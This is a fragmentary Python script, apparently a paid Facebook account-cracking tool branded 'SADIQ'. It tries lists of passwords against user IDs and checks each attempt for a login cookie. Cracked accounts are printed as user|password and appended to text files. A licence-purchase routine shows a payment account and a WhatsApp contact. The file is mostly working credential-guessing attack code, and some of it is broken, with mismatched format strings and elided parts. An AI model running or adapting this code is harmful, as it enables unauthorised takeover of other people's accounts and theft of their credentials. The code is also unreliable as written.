...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mSADIQ successful_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mSADIQ successful_OK.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back SADIQ Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[SADIQ] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [SADIQ-successful] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('SADIQ_successful.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [SADIQ-successful] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('SADIQ_successful.txt' , 'a').write('%s\n' % wrt)
                        break
                        ...
                        pass
                    print('\r%s [SADIQ-succesful] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('SADIQ_succeful.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
...
def bnsbuy():
    ...
    if to in r:
        ...
        print
        print('\reasy paisa Account Number 03456170815\n')
        print('\rAccount Name Sadiq Hussain\n')
        print
        print
        ...
        os.system('am start https://wa.me/+923336418640?text=' + tks)
